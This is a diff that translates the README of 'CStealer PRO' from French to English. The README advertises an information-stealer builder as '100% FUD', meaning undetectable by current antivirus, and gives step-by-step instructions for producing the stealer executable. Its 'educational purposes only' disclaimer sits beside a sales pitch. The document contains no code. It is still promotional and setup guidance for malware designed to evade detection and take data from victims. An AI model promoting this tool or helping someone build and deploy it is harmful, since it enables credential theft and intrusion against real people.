@@ -2,39 +2,39 @@
 
 ## 🚀 **CStealer PRO** - 100% FUD
 
-### Une solution avancée et intuitive pour vos tests de sécurité.
+### An advanced and intuitive solution for your security testing needs.
 
-#### Fonctionnalités clés :
-- **100% FUD** : Passé inaperçu par les antivirus les plus récents.
-- **Rapidité** : Construction de payloads en quelques secondes.
-- **Personnalisable** : Ajoutez vos propres configurations pour maximiser l'efficacité.
-- **Support Windows 10/11**.
-- **Interface utilisateur simple et intuitive.**
+#### Key Features:
+- **100% FUD**: Fully undetectable by the latest antivirus software.
+- **Speed**: Generate payloads in seconds.
+- **Customizable**: Add your own configurations to maximize effectiveness.
+- **Windows 10/11 support**.
+- **Simple and intuitive user interface.**
 
 ---
 
-### 📦 **Installation facile**
+### 📦 **Easy Installation**
 
-#### Prérequis :
+#### Requirements:
 - Windows 10/11
 - [Python 3.11.6](https://www.python.org/ftp/python/3.11.6/python-3.11.6-amd64.exe)
 - [Git](https://git-scm.com/download/win)
 
-#### Étapes d'installation :
-1. Téléchargez le code source (zip).
-2. Extrayez le contenu du fichier zip.
-3. Installez les dépendances nécessaires en lançant le fichier `install.bat`.
-4. Lancez le builder en ouvrant le fichier `builder.pyw`.
-5. Suivez les instructions affichées. Votre fichier exécutable sera généré dans le dossier `dist` sous le nom `cstealer_pro.exe`.
+#### Installation Steps:
+1. Download the source code (zip).
+2. Extract the contents of the zip file.
+3. Install the necessary dependencies by running the `install.bat` file.
+4. Run the builder by opening the `builder.pyw` file.
+5. Follow the on-screen instructions. Your executable file will be generated in the `dist` folder as `cstealer_pro.exe`.
 
 ---
 
-### ⚠️ Avertissements
-- Ce projet est fourni à titre **éducatif uniquement**.  
-- L'utilisation à des fins illégales est **strictement interdite**.  
-- Nous déclinons toute responsabilité en cas d'utilisation abusive.
+### ⚠️ Disclaimer
+- This project is provided for **educational purposes only**.  
+- Using it for illegal activities is **strictly prohibited**.  
+- We are not responsible for any misuse of this tool.
 
-**Pour des professionnels, par des professionnels.**  
-Rejoignez-nous dès maintenant pour tester vos propres environnements avec des outils modernes et innovants.
+**Built by professionals, for professionals.**  
+Join us now to test your own environments with modern and innovative tools.
 
-<a href=#top>Retour en haut</a>
+<a href=#top>Back to Top</a>
